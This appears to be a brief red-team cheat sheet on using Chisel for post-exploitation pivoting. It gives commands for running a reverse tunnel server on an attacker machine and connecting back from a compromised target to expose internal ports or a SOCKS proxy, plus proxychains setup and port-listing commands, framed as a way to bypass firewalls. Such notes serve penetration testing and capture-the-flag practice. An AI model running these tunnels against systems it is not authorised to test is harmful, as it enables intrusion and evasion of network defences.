---
title: "Chisel Port Forwarding Guide"
date: 2026-01-13
tags: ['networking', 'security', 'post-exploitation', 'red-teaming', 'tunneling', 'port-forwarding', 'chisel-tool']
---

---

## 🧠 What is Chisel?

**Chisel** is a fast TCP/UDP tunnel over HTTP, useful for **port forwarding** and **pivoting**, especially during red teaming or CTFs.

---

## 🔥 Attacker Machine Setup (Chisel Server)

Start Chisel in **reverse mode** on the attacker machine:

```bash
./chisel_1.5.1 server -p 9005 --reverse
````

* `-p 9005`: Listen on port 9005
* `--reverse`: Accept reverse port forwarding connections

---

## 🎯 Target Machine Setup (Chisel Client)

### Forward all traffic to attacker:

```bash
./chisel client 10.10.14.19:9005 R:socks
```

> This sets up a **SOCKS proxy** from the target to the attacker's Chisel server

---

### Forward Specific Ports:

```bash
./chisel.exe client 127.0.0.1:8001 R:80:localhost:80 R:443:localhost:443 R:8888:localhost:8888 R:9251:localhost:9251
```

> Forwards internal services to the attacker’s machine over Chisel

---

### For Proxychains Usage:

```powershell
.\chisel.exe client 10.10.14.XX:8005 R:1080:socks
```

> Then configure `proxychains.conf` with `socks5 127.0.0.1 1080`

---

## 📡 Commands to Find Open Ports

### 🐧 Linux

```bash
sudo netstat -tuln
sudo lsof -i -P -n | grep LISTEN
nmap -sT -O localhost
```

---

### 🪟 Windows

```powershell
netstat -ano | findstr LISTENING
Get-NetTCPConnection | Where-Object {$_.State -eq 'Listen'}
Test-NetConnection -ComputerName localhost -Port 80
```

---

> 🧠 Tip: Chisel is perfect for **bypassing firewalls** and **pivoting to internal networks** during post-exploitation!